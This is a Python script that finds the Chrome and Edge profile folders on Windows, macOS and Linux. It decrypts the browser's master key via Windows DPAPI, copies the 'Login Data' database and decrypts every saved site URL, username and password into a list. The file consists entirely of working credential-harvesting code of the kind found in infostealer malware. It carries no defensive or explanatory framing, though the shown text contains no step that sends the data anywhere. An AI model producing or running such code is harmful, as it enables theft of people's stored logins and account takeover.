import base64
import json
import os
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import sys

KEY_FILE = "Local State"
LOGIN_DATA_FILE = "Login Data"
TEMP_FILE = "TEMP.db"


def get_key(path):
    with open(path, "r",
              encoding="UTF-8") as file:
        local_state = file.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = generate_cipher(key, iv)
    decrypted_pass = decrypt_payload(cipher, payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


def load_read_only_data(file_path):
    shutil.copy2(file_path, TEMP_FILE)
    return sqlite3.connect(TEMP_FILE)


def get_user_info(path, key):
    conn = load_read_only_data(path)
    cursor = conn.cursor()
    accounts = []
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        decrypted_password = decrypt_password(encrypted_password, key)
        accounts.append({
            "url": url,
            "username": username,
            "password": decrypted_password
        })
    cursor.close()
    conn.close()
    os.remove(TEMP_FILE)
    return accounts


def get_chrome_path():
    path_name = ""
    if os.name == "nt":
        path_name = os.getenv('localappdata') + \
                    '\\Google\\Chrome\\User Data'
    elif os.name == "posix":
        path_name = os.getenv('HOME')
        if sys.platform == "darwin":
            path_name += '/Library/Application Support/Google/Chrome'
        else:
            path_name += '/.config/google-chrome'
    if not os.path.isdir(path_name):
        return None
    else:
        return path_name


def get_edge_path():
    path_name = ""
    if os.name == "nt":
        path_name = os.getenv('localappdata') + \
                    '\\Microsoft\\Edge\\User Data'
    elif os.name == "posix":
        path_name = os.getenv('HOME')
        if sys.platform == "darwin":
            path_name += '/Library/Application Support/Microsoft/Edge'
        else:
            path_name += '/.config/microsoft-edge/Default/'
    if not os.path.isdir(path_name):
        return None
    else:
        return path_name


def get_path():
    paths = []
    chrome_path = get_chrome_path()
    edge_path = get_edge_path()
    if chrome_path is not None:
        paths.append(chrome_path)
    if edge_path is not None:
        paths.append(edge_path)
    return paths
